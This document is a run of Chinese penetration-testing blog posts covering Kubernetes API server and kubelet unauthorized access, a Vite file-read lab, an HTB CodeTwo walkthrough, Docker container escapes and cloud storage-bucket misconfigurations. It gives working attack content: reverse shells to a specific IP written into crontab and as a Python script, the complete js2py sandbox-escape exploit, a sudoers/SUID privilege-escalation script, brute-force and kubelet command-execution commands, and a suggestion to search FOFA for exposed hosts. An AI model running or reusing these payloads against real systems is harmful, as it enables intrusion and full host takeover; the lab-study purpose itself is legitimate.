https://kuboard.cn/install-script/calico/calico-3.9.2.yaml\rexport POD_SUBNET=10.244.0.0/16\rsed -i \u0026#34;s#192\\.168\\.0\\.0/16#${POD_SUBNET}#\u0026#34; calico-3.9.2.yaml\rkubectl apply -f calico-3.9.2.yaml\rsystemctl stop firewalld \u0026amp;\u0026amp; systemctl disable firewalld\rsed -i \u0026#39;s/enforcing/disabled/\u0026#39; /etc/selinux/config \u0026amp;\u0026amp; setenforce 0\rrm -rf /etc/yum.repos.d/* curl -o /etc/yum.repos.d/aliyun.repo https://mirrors.aliyun.com/repo/Centos-7.repo\r2：\rcat \u0026gt;\u0026gt;/etc/hosts \u0026lt;\u0026lt;EOF\r192.168.180.110 k8s-master\r192.168.180.120 k8s-node1\r192.168.180.130 k8s-node2\rEOF\r3\rhostnamectl set-hostname k8s-master \u0026amp;\u0026amp; bash\rhostnamectl set-hostname k8s-node1 \u0026amp;\u0026amp; bash\rhostnamectl set-hostname k8s-node2 \u0026amp;\u0026amp; bash\r4\r#k8s-master:\ryum install chrony -y\rvim /etc/chrony.conf\rserver ntp6.aliyun.com iburst\rallow 192.168.0.0/16\rsystemctl enable chronyd.service\rsystemctl restart chronyd.service\rchronyc sources\rchronyc -a makestep\r#k8s-node1/k8s-node2:\ryum install chrony -y\rvim /etc/chrony.conf\rserver k8s-master iburst\rsystemctl enable chronyd.service\rsystemctl restart chronyd.service\rchronyc sources\r#关闭交换分区\rswapoff -a\rsed -ri \u0026#39;s/.*swap.*/#\u0026amp;/\u0026#39; /etc/fstab\r5\rmodprobe br_netfilter\rcat \u0026gt; /etc/sysctl.conf \u0026lt;\u0026lt; EOF\rnet.ipv4.ip_forward = 1\rnet.bridge.bridge-nf-call-ip6tables = 1\rnet.bridge.bridge-nf-call-iptables = 1\rEOF\rsysctl -p\r6\ryum install -y conntrack ntpdate ntp ipvsadm ipset iptables curl sysstat libseccomp wget vim net-tools git\rcat \u0026gt; /etc/sysconfig/modules/ipvs.modules \u0026lt;\u0026lt;EOF\r#!/bin/bash\rmodprobe -- ip_vs\rmodprobe -- ip_vs_rr\rmodprobe -- ip_vs_wrr\rmodprobe -- ip_vs_sh\rEOF\rchmod 755 /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; bash /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4\rlsmod | grep -e ip_vs -e nf_conntrack\r7\rcat \u0026lt;\u0026lt; EOF \u0026gt; /etc/modules-load.d/containerd.conf\roverlay\rbr_netfilter\rEOF\rmodprobe overlay\rmodprobe br_netfilter\rwget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\r#安装docker\ryum install -y containerd.io docker-ce docker-ce-cli\rmkdir /etc/containerd -p containerd config default \u0026gt; /etc/containerd/config.toml\r#修改文件\rvim /etc/containerd/config.toml\rSystemdCgroup = false 改为 SystemdCgroup = true\rsandbox_image = \u0026#34;k8s.gcr.io/pause:3.6\u0026#34; 改为：\rsandbox_image = \u0026#34;registry.aliyuncs.com/google_containers/pause:3.6\u0026#34;\r#docker加速\rcat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt;EOF\r{\r\u0026#34;registry-mirrors\u0026#34;: [\r\u0026#34;https://do.nark.eu.org\u0026#34;,\r\u0026#34;https://dc.j8.work\u0026#34;,\r\u0026#34;https://docker.m.daocloud.io\u0026#34;,\r\u0026#34;https://dockerproxy.com\u0026#34;,\r\u0026#34;https://docker.mirrors.ustc.edu.cn\u0026#34;,\r\u0026#34;https://docker.nju.edu.cn\u0026#34;\r],\r\u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;]\r}\rEOF\rsystemctl enable containerd \u0026amp;\u0026amp; systemctl start containerd\rsystemctl enable docker \u0026amp;\u0026amp; systemctl start docker\r8\rcat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo\r[kubernetes]\rname=Kubernetes\rbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/\renabled=1\rgpgcheck=0\rrepo_gpgcheck=0\rgpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg\rEOF\ryum clean all yum makecache fast\r9\r#安装指定版本\ryum install -y kubelet-1.23.0-0 kubeadm-1.23.0-0 kubectl-1.23.0-0 --disableexcludes=kubernetes\rvim /etc/sysconfig/kubelet\rKUBELET_EXTRA_ARGS=\u0026#34;--cgroup-driver=systemd\u0026#34;\rsystemctl enable kubelet \u0026amp;\u0026amp; systemctl start kubelet\r#初始化\rkubeadm init --kubernetes-version=v1.23.0 --pod-network-cidr=10.244.0.0/16 --image-repository registry.aliyuncs.com/google_containers --apiserver-advertise-address 192.168.180.110\r#这个是初始化成功后有显示的\rexport KUBECONFIG=/etc/kubernetes/admin.conf\rmkdir -p $HOME/.kube\rsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\rsudo chown $(id -u):$(id -g) $HOME/.kube/config\r10\r#master初始化成功后将这一段复制到两个节点上加入群集\rkubeadm join 192.168.180.110:6443 --token 8zgrg1.dwy5s6rqzzhlkkdl --discovery-token-ca-cert-hash sha256:9dfa30a7a8314887ea01b05cc26e80856bfd253d1a71de7cd5501c42f11c0326\r11\rkubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml\rkubectl get pod -n kube-system -o wide\r这里只需要等待他们全部running即可\rkubectl get nodes K8S集群渗透 # 确保都running不然实验不行而且版本要合适\n1：API Server未授权访问\u0026amp;kubelet未授权访问 # API Server 资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制\r旧版本的k8s的API Server默认会开启两个端口：8080和6443。\r6443是安全端口，安全端口使用TLS加密；但是8080端口无需认证，\r仅用于测试。6443端口需要认证，且有 TLS 保护。（k8s\u0026lt;1.16.0）\r新版本k8s默认已经不开启8080。需要更改相应的配置\r漏洞条件：\r1、Kubernetes版本小于 v1.20\r2、8080端口可访问（配置不当）\rcd /etc/kubernetes/manifests/\r- --insecure-port=8080\r- --insecure-bind-address=0.0.0.0\rkubectl get pod -n kube-system -o wide查看K8S网络工具搭建情况 当你发现有未授权后使用官方工具来访问\nkubectl.exe -s 192.168.79.141:8080 get nodes 获取节点信息\rkubectl.exe -s 192.168.79.141:8080 get pods 获取应用\rkubectl -s 192.168.79.141:8080 create -f test.yaml 创建文件pod应用为创建镜像\rkubectl -s 192.168.79.141:8080 --namespace=default exec -it 名字 bash 进入镜像\recho -e \u0026#34;* * * * * root bash -i \u0026gt;\u0026amp; /dev/tcp/ip/4444 0\u0026gt;\u0026amp;1\\n\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab 用挂载逃逸计划任务反弹 test.yaml:\rapiVersion: v1\rkind: Pod\rmetadata:\rname: manbo\rspec:\rcontainers:\r\\- image: nginx\rname: test-container\rvolumeMounts:\r\\- mountPath: /mnt\rname: test-volume\rvolumes:\r\\- name: test-volume\rhostPath:\rpath: / 创建节点查看POD成功创建\n进入\necho -e \u0026ldquo;* * * * * root bash -i \u0026gt;\u0026amp; /dev/tcp/116.62.32.64/4444 0\u0026gt;\u0026amp;1\\n\u0026rdquo; \u0026raquo; /mnt/etc/crontab反弹获得本机shell\n成功拿下这台docker镜像的本机node1\n2、攻击6443端口：API Server未授权访问 # 一些集群由于鉴权配置不当，将\u0026#34;system:anonymous\u0026#34;用户绑定到\u0026#34;cluster-admin\u0026#34;用户组，从而使6443端口允许匿名用户以管理员权限向集群内部下发指令。\rkubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous 记得用https访问\n发恶意yaml文件包\nhttps://192.168.139.130:6443/api/v1/namespaces/default/pods/\nPOST：{\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;annotations\u0026#34;:{\u0026#34;kubectl.kubernetes.io/last-applied-configuration\u0026#34;:\u0026#34;{\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34;v1\\\u0026#34;,\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Pod\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{\\\u0026#34;annotations\\\u0026#34;:{},\\\u0026#34;name\\\u0026#34;:\\\u0026#34;test02\\\u0026#34;,\\\u0026#34;namespace\\\u0026#34;:\\\u0026#34;default\\\u0026#34;},\\\u0026#34;spec\\\u0026#34;:{\\\u0026#34;containers\\\u0026#34;:[{\\\u0026#34;image\\\u0026#34;:\\\u0026#34;nginx:1.14.2\\\u0026#34;,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;test02\\\u0026#34;,\\\u0026#34;volumeMounts\\\u0026#34;:[{\\\u0026#34;mountPath\\\u0026#34;:\\\u0026#34;/host\\\u0026#34;,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;host\\\u0026#34;}]}],\\\u0026#34;volumes\\\u0026#34;:[{\\\u0026#34;hostPath\\\u0026#34;:{\\\u0026#34;path\\\u0026#34;:\\\u0026#34;/\\\u0026#34;,\\\u0026#34;type\\\u0026#34;:\\\u0026#34;Directory\\\u0026#34;},\\\u0026#34;name\\\u0026#34;:\\\u0026#34;host\\\u0026#34;}]}}\\n\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;test02\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;spec\u0026#34;:{\u0026#34;containers\u0026#34;:[{\u0026#34;image\u0026#34;:\u0026#34;nginx:1.14.2\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;test02\u0026#34;,\u0026#34;volumeMounts\u0026#34;:[{\u0026#34;mountPath\u0026#34;:\u0026#34;/host\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;host\u0026#34;}]}],\u0026#34;volumes\u0026#34;:[{\u0026#34;hostPath\u0026#34;:{\u0026#34;path\u0026#34;:\u0026#34;/\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;Directory\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;host\u0026#34;}]}} 成功创建pod 并且挂载到host里面一样使用mnt提权\n进入方式\n1\rkubectl --insecure-skip-tls-verify -s https://192.168.79.131:6443 --namespace=default exec -it heikea bash\rkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.\rPlease enter Username: r\rroot@heikea:/#\rroot@heikea:/#\rroot@heikea:/#\r2\rkubectl.exe -s 192.168.79.131:8080 --namespace=default exec -it heikea bash 3、攻击10250端口：kubelet未授权访问 # 配置问题\nhttps://192.168.79.131:10250/pods\r/var/lib/kubelet/config.yaml\r修改authentication的anonymous为true,\r将authorization mode修改为AlwaysAllow,\r重启kubelet进程-systemctl restart kubelet 没有配置的时候进不去一旦修改\n修改后\n获得三个信息\n1：namespace= kube-system\r2: pod= etcd-master-1\r3: container =etcd\rcurl -XPOST -k \u0026#34;https://192.168.79.131:10250/run/kube-system/etcd-master-1/etcd\u0026#34; -d \u0026#34;cmd=id\u0026#34;\r成功命令执行\r被攻击的 Docker 镜像对应的是 kube-scheduler 组件\r该请求的本质是通过 Kubelet 的 10250 端口（默认只读端口，若被配置为可写则存在风险），在 kube-scheduler-master-1 Pod 的 kube-scheduler 容器内执行命令（如 id）\r在fofa搜索port=\u0026#34;10250\u0026#34; 6443测试 ","date":"27 August 2025","externalUrl":null,"permalink":"/posts/k8s1/","section":"Posts","summary":"","title":"K8s-1-未授权访问","type":"posts"},{"content":" Pane12靶机-Vite-宝塔提权 # 这边直接进入8080端口打开vite\n启动后访问3000端口是一个宝塔的界面\n这里使用nuclei或者你搜索CVE搜索漏洞可以发现一个CVE-2025-31125\n192.168.1.208:3000/@fs/etc/passwd?import\u0026amp;?inline=1.wasm?init\nbase64解密\nhydra -l welcome -P /usr/share/john/password.lst ssh://192.168.1.208:22 -V -I -f -u -t 50 -e nsr 拿到一个用户爆破\n发现一个宝塔的程序可以先修改面板密码然后进入 进入后这里发现两个一个是直接打开终端\n还有写计划任务\n宝塔的计划任务目录在\n/www/server/cron/\n","date":"26 August 2025","externalUrl":null,"permalink":"/posts/pane12/","section":"Posts","summary":"","title":"Pane12靶机-VITE","type":"posts"},{"content":"","date":"26 August 2025","externalUrl":null,"permalink":"/tags/vite/","section":"Tags","summary":"","title":"Vite","type":"tags"},{"content":" CodeTwo靶机-HTB # 扫描发现了8000端口可以下载源码并执行JS命令\r下载分析这是一个flask框架使用js2py来执行JS代码并且使用的sqlite数据库方便快捷\rSQLite3 本身不提供密码保护机制，它只是一个单文件数据库，数据存储在 .db文件里（如 users.db）。\rjs2py的某个全局变量存在一个漏洞，攻击者可以使用这个漏洞在js代码中获得一个python对象的引用，使得攻击者可以逃逸js环境，在主机上执行任意命令。\rCVE-2024-28397\rlet cmd = \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.28/3333 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;;\rlet hacked, bymarve, n11;\rlet getattr, obj;\rhacked = Object.getOwnPropertyNames({});\rbymarve = hacked.__getattribute__;\rn11 = bymarve(\u0026#34;__getattribute__\u0026#34;);\robj = n11(\u0026#34;__class__\u0026#34;).__base__;\rgetattr = obj.__getattribute__;\rfunction findpopen(o) {\rlet result;\rfor (let i in o.__subclasses__()) {\rlet item = o.__subclasses__()[i];\rif (item.__module__ == \u0026#34;subprocess\u0026#34; \u0026amp;\u0026amp; item.__name__ == \u0026#34;Popen\u0026#34;) {\rreturn item;\r}\rif (item.__name__ != \u0026#34;type\u0026#34; \u0026amp;\u0026amp; (result = findpopen(item))) {\rreturn result;\r}\r}\r}\rfindpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();\r\u0026#34;OK\u0026#34;; 反弹成功后sqlite一般在Instance下面我们使用sqlite3来查看数据库\nsqlite3 /home/app/instance/users.db\r.tables\rcode_snippet user SELECT * FROM user;\r1|marco|649c9d65a206a75f5abe509fe128bce5\r2|app|a97588c0e2fa3a024876339e27aeb42e\r3|123|202cb962ac59075b964b07152d234b70\rMD5 分析\r破解结果: sweetangelbabylove 登录上去发现可以使用npbackup-cli\rnpbackup-cli是一个基于 Restic 的备份工具\rRestic 是一个开源、跨平台的备份工具，专注于安全、高效和易用性。它采用加密存储，支持增量备份，并可以存储数据到多种后端（如本地磁盘、SFTP、AWS S3、MinIO 等）。\rmarco@codetwo:~$ cat \u0026gt; /tmp/exploit.sh \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39;\r\u0026gt; #!/bin/bash\r\u0026gt; # 设置SUID权限\r\u0026gt; chmod +s /bin/bash\r\u0026gt; # 或者直接添加sudo权限\r\u0026gt; echo \u0026#34;marco ALL=(ALL) NOPASSWD:ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\r\u0026gt; EOF\rsudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf --external-backend-binary=/tmp/exploit.sh --backup\r--external-backend-binary=/tmp/exploit.sh→ 让npbackup执行你的脚本\r--backup /etc/passwd /tmp/→ 触发备份操作，使脚本被执行 ","date":"25 August 2025","externalUrl":null,"permalink":"/posts/codetwo/","section":"Posts","summary":"","title":"CodeTwo靶机-HTB","type":"posts"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker","type":"tags"},{"content":" Docker-逃逸-LINux内核漏洞 # 如何判断在不在docker环境 # 容器逃逸方法检测指北 | T Wiki\n1.cat /proc/1/cgroup | grep -qi docker \u0026amp;\u0026amp; echo \u0026#34;Is Docker\u0026#34; || echo \u0026#34;Not Docker\u0026#34; 2.检查/.dockerenv文件 3.检查mount信息 4.查看硬盘 fdisk -l 如果测试了特权不行，socket,挂载都没有，就测试docker漏洞，内核漏洞，翻数据库文件找和主目录有交集的文件 如果是JAVA应用你进去就是ROOT 就考虑逃逸 如果是WWW那么还要加一步提权到ROOT 再到逃逸 LINUX内核漏洞 CVE-2022-0492 # 影响版本: linux kernel 5.17-rc3\r漏洞危害: 当容器没有开启额外安全措施时，获得容器内root权限即可逃逸到宿主机\r下载POC解压创建一个有缺陷的DOCKER上传执行EXP\rdocker run --rm -it --cap-add=SYS_ADMIN --security-opt=\u0026#34;apparmor=unconfined\u0026#34; ubuntu:20.04 /bin/bash docker cp exp.sh 11e84a3b3d90:/ 复制上传 如果真实环境就下载wget啊什么的\rchmod 777 exp.sh\r./exp.sh \u0026#34;cat /etc/passwd\u0026#34; 内核漏洞-CVE-2022-0847 # 影响版本: 高于5.8的Linux内核版本会受到影响\r漏洞危害：攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权root\r复现环境：Ubuntu 16.04 X64\r参考：\rwiki.teamssix.com/CloudNative/Docker/CVE-2022-0847.html\r利用：github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git\rCVE-2022-0847-DirtyPipe-Exploits-main 上传里面三个文件编译执行\rdocker run -itd ubuntu:latest 启动镜像\rapt-get update更新\rapt-get install gcc 如果编译完上传上去可能有版本差异 生成文件来执行\nDocker远程 API未授权访问逃逸 # 当Docker守护进程被配置为监听网络端口（通常是TCP端口2375）且未启用适当的身份验证机制时，攻击者可以未经授权访问Docker API。利用此漏洞，攻击者可以在主机系统上创建、修改和执行容器，可能导致远程代码执行、数据窃取以及完全控制主机系统。\r通常端口是2375 原理通过未授权创建容器挂载后往计划任务写入反弹shell\r不同环境计划任务不同 不同系统可能反弹命令不同\r使用dockerRemoteApiGetRootShell攻击 项目如下 需要python2来运行\r反弹需要镜像名字但是这个靶场可能环境有问题 复现环境：http://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce\n利用项目：https://github.com/xiju2003/dockerRemoteApiGetRootShell-fix\n##安装类库\npip install -r requirements.txt ##查看运行的容器\npython dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 ##查看所有的容器\npython dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -a ##查看所有镜像\npython dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -l ##查看端口映射\npython dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L ##写计划任务（centos,redhat等,加-u参数用于ubuntu等）\npython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口\rpython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口 ##写sshkey(自行修改脚本的中公钥)\npython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -k ##在容器中执行命令\npython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -e \u0026#34;id\u0026#34; -I 容器id ##删除容器\npython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -c -I 容器id ##修改client api版本\npython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -v 1.22 ##查看服务端api版本\npython dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -V ","date":"25 August 2025","externalUrl":null,"permalink":"/posts/docker3/","section":"Posts","summary":"","title":"Docker-逃逸-LINux内核漏洞","type":"posts"},{"content":"","date":"25 August 2025","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":" Docker-逃逸-本身漏洞-CDK工具使用 # 如何判断在不在docker环境 # 容器逃逸方法检测指北 | T Wiki\n1.cat /proc/1/cgroup | grep -qi docker \u0026amp;\u0026amp; echo \u0026#34;Is Docker\u0026#34; || echo \u0026#34;Not Docker\u0026#34; 2.检查/.dockerenv文件 3.检查mount信息 4.查看硬盘 fdisk -l 如果测试了特权不行，socket,挂载都没有，就测试docker漏洞，内核漏洞，翻数据库文件找和主目录有交集的文件 如果是JAVA应用你进去就是ROOT 就考虑逃逸 如果是WWW那么还要加一步提权到ROOT 再到逃逸 本身漏洞CVE-2019-5736 runC容器逃逸 # Docker version \u0026lt;= 18.09.2\rRunC version \u0026lt;= 1.0-rc6\r条件如上\r需要go语言来编译POC 这个缺陷是需要管理员自己进入才能触发----\rsudo yum install golang\rCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go linux环境编译\rdocker run -itd --cap-add=SYS_ADMIN ubuntu:latest创建环境\rdocker cp main name:/ 上传镜像\rdocker exec -it name /bin/sh 触发反弹 https://github.com/Frichetten/CVE-2019-5736-PoC\n下载poc修改反弹代码\n上传文件执行\nNMAP扫描 模拟管理员登录\nNMAP扫描 自动反弹本机的文件ROOT到反弹的位置\nNMAP扫描 d\nCVE-2020-15257 containerd逃逸-工具CDK介绍 # containerd \u0026lt; 1.4.3\rcontainerd \u0026lt; 1.3.9\r我们使用工具来逃逸上传进去添加777权限\r普通检测./cdk_linux_amd64 evaluate ./cdk_linux_amd64 run shim-pwn reverse xx.xx.xx.xx xxxx 使用CVE-2020-15257\r如果检测到就使用 例如特权模式挂载命令 ./cdk run mount-disk socket挂载漏洞 ./cdk run docker-sock-pwn /var/run/docker.sock \u0026#34;touch /host/tmp/pwn-success\u0026#34; 命令执行\tUsage:\rcdk evaluate [--full]\rcdk run (--list | \u0026lt;exploit\u0026gt; [\u0026lt;args\u0026gt;...])\rcdk \u0026lt;tool\u0026gt; [\u0026lt;args\u0026gt;...]\rEvaluate:\rcdk evaluate Gather information to find weekness inside container.\rcdk evaluate --full Enable file scan during information gathering.\rExploit:\rcdk run --list List all available exploits.\rcdk run \u0026lt;exploit\u0026gt; [\u0026lt;args\u0026gt;...] Run single exploit, docs in https://github.com/Xyntax/CDK/wiki\rTool:\rvi \u0026lt;file\u0026gt; Edit files in container like \u0026#34;vi\u0026#34; command.\rps Show process information like \u0026#34;ps -ef\u0026#34; command.\rnc [options] Create TCP tunnel.\rifconfig Show network information.\rkcurl\t(get|post) \u0026lt;url\u0026gt; \u0026lt;data\u0026gt; Make request to K8s api-server.\rucurl (get|post) \u0026lt;socket\u0026gt; \u0026lt;uri\u0026gt; \u0026lt;data\u0026gt; Make request to docker unix socket.\rprobe \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; \u0026lt;parallel\u0026gt; \u0026lt;timeout-ms\u0026gt; TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000\rOptions:\r-h --help Show this help msg.\r-v --version Show version. https://github.com/cdk-team/CDK\nNMAP扫描 拿到主机权限\nNMAP扫描 ","date":"23 August 2025","externalUrl":null,"permalink":"/posts/docker2/","section":"Posts","summary":"","title":"Docker-逃逸-本身漏洞-CDK工具使用","type":"posts"},{"content":" Docker-逃逸-安全-挂载-特权 # 如何判断在不在docker环境 # 容器逃逸方法检测指北 | T Wiki\n1.cat /proc/1/cgroup | grep -qi docker \u0026amp;\u0026amp; echo \u0026#34;Is Docker\u0026#34; || echo \u0026#34;Not Docker\u0026#34; 2.检查/.dockerenv文件 3.检查mount信息 4.查看硬盘 fdisk -l 如果测试了特权不行，socket,挂载都没有，就测试docker漏洞，内核漏洞，翻数据库文件找和主目录有交集的文件 如果是JAVA应用你进去就是ROOT 就考虑逃逸 如果是WWW那么还要加一步提权到ROOT 再到逃逸 目录挂载如果有etc啊log就不确定能不能获得关键信息了 特权模式逃逸 # docker run --rm --privileged=true -it alpine 启动交互终端 名字叫alpine 停止就删除 并且 有特权模式的docker镜像 拿去后进入一个终端可以发现根目录下就有docker特征\u0026mdash;确定在docker里面了\nNMAP扫描 判断是否是特权模式 # cat /proc/self/status | grep CapEff 如果在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff 特权模式挂载逃逸 # 特权模式查看磁盘信息\n现在我们的test里面就是根目录信息\nfdisk -l mkdir /test \u0026amp;\u0026amp; mount /dev/sda1 /test 挂载了 真机的物理分区 /dev/sda1 到容器内的 /test 目录，实现了容器与真机之间的 文件系统共享 往test里面对应就是根目录写入的文件对应显示真机目录 NMAP扫描 下一步写入计划任务反弹SHELL\nDocker Socket 逃逸 # docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu 探测存不存在sock ls -lah /var/run/docker.sock 如果存在这个文件，说明漏洞可能存在 容器内部安docker客户端 docker exec -it with_docker_sock /bin/bash apt-get update apt-get install curl curl -fsSL https://get.docker.com/ | sh 安装失败就手动安装 apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin docker-ce-rootless-extras docker-buildx-plugin 执行docker命令逃逸 docker run -it -v /:/host ubuntu /bin/bash -v /:/host：将宿主机的根目录（/）挂载到容器内的 /host 目录对 /host 的操作会直接影响宿主机的文件系统 chroot /host 改变根目录 不是特权但是在docker环境并且发现sock文件\nNMAP扫描 挂载成功逃逸成功\nNMAP扫描 docker-procfs逃逸 # docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 启动docker find / -name core_pattern 检查是否存在漏洞 如果有两个就表示有 cat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir 检查工作目录绝对路径 安装gcc apt-get update -y \u0026amp;\u0026amp; apt-get install gcc -y 找到工作目录\nworkdir=/var/lib/docker/overlay2/61934ad893e443d362bd64e7d78111896fefcfaaed6b550f0a185d9745465676/work 0 0\nNMAP扫描 cat \u0026gt;/tmp/.x.py \u0026lt;\u0026lt; EOF\r#!/usr/bin/python\rimport os\rimport pty\rimport socket\rlhost = \u0026#34;116.62.32.64\u0026#34; lport = 5566\rdef main():\rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rs.connect((lhost, lport))\ros.dup2(s.fileno(), 0)\ros.dup2(s.fileno(), 1)\ros.dup2(s.fileno(), 2)\ros.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;)\rpty.spawn(\u0026#34;/bin/bash\u0026#34;)\ros.remove(\u0026#39;/tmp/.x.py\u0026#39;)\rs.close()\rif __name__ == \u0026#34;__main__\u0026#34;:\rmain()\rEOF\r设置好反弹的IP以及端口\rchmod 777 .x.py 给权限 NMAP扫描 echo -e \u0026#34;|/var/lib/docker/overlay2/61934ad893e443d362bd64e7d78111896fefcfaaed6b550f0a185d9745465676/merged/tmp/.x.py \\rcore \u0026#34; \u0026gt; /host/proc/sys/kernel/core_pattern 设置好挂载路径与工作路径对应\ncat \u0026gt;/tmp/x.c \u0026lt;\u0026lt; EOF\r#include \u0026lt;stdio.h\u0026gt;\rint main(void)\r{\rint *a = NULL;\r*a = 1;\rreturn 0;\r}\rEOF\rgcc x.c -o x 编译\r执行文件：\r./x nc -lvvp xxxx 反弹成功\nNMAP扫描 ","date":"18 August 2025","externalUrl":null,"permalink":"/posts/docker/","section":"Posts","summary":"","title":"Docker-逃逸-安全","type":"posts"},{"content":"","date":"14 August 2025","externalUrl":null,"permalink":"/tags/aksk/","section":"Tags","summary":"","title":"Aksk","type":"tags"},{"content":"","date":"14 August 2025","externalUrl":null,"permalink":"/tags/oss/","section":"Tags","summary":"","title":"Oss","type":"tags"},{"content":" 云上服务-OSS存储桶渗透-AKSK两种利用特征-ECS元数据横向移动 # OSS # OSS介绍 # 特别提示访问阿里云不要开启抓包可能会封号\n各个云厂商对云服务的叫法都不统一，这里统一以AWS为例。\rS3 对象存储Simple Storage Service，\r简单的说就是一个类似网盘的东西\rEC2 即弹性计算服务Elastic Compute Cloud，\r简单的说就是在云上的一台虚拟机。\rRDS 云数据库Relational Database Service，\r简单的说就是云上的一个数据库。\rIAM 身份和访问管理Identity and Access Management，\r简单的说就是云控制台上的一套身份管理服务，可以用来管理每个子账号的权限\r不同厂商对象存储名字不同\r#对象存储各大云名词：\r阿里云：OSS 腾讯云：COS 华为云：OBS\r谷歌云：GCS 微软云：Blob 亚马逊云：S3\r而且OSS可以\r创建OSS桶 # 购买服务后创建名字注意必须唯一\nNMAP扫描 可以看到自动我们域名变成了这个\nNMAP扫描 我们上传一个文件还访问不到需要临时凭证\nNMAP扫描 这时候我们修改ACL策略 先关闭这个\nNMAP扫描 公开读取-需要文件名 # 修改读写为公开读取\nNMAP扫描 原来不修改的话你访问是不会下载的\nameti14.oss-cn-beijing.aliyuncs.com/44.jpg\nNMAP扫描 修改后无需凭证即可下载\nNMAP扫描 公开上传-任意上传 # 如果你的权限是开启了公共读写-那么就可以发包上传了\nNMAP扫描 可以看到200了\nNMAP扫描 文件列表多出了文件\nNMAP扫描 或者开启策略\rossPutObject NMAP扫描 成功上传! NMAP扫描 .\nOSS-目录遍历 # 条件是\n1、公共读取-私有也可以\r2、Policy(listObject)\r-权限Bucket授权策略：设置ListObject显示完整结构\rOSSFileBrowse-1.0-SNAPSHOT-工具查看内容\r设置权限是list\nNMAP扫描 当你再次访问基本的域名即可遍历OSS全部内容-不用加文件名\nhttps://ameti14.oss-cn-beijing.aliyuncs.com/\nNMAP扫描 工具可以访问测试并且可以测试上传 仅限简单漏洞测试\nNMAP扫描 工具测试查看有无敏感泄露内容\nNMAP扫描 OSS-任意修改策略 # https://wiki.teamssix.com/CloudService/S3/bucket-policy-able-to-write.html\n设置了这个策略并且授权全部账号后攻击者可以任意修改你的策略来实现访问\nNMAP扫描 就是修改下面这个语法\nNMAP扫描 OSS-域名接管 # 原理如下：\r比如你的网站\rameti14.oss-cn-beijing.aliyuncs.com/ -\u0026gt; 绑定域名 ti14cham.sec.cloud 上去\r然后你没用了你把这个ameti14.oss-cn-beijing.aliyuncs.com桶删除了X 但是注意你的域名还在和你的桶绑定\r而你的桶因为释放了别人就可以创建同一地区，同一名字实现接管域名 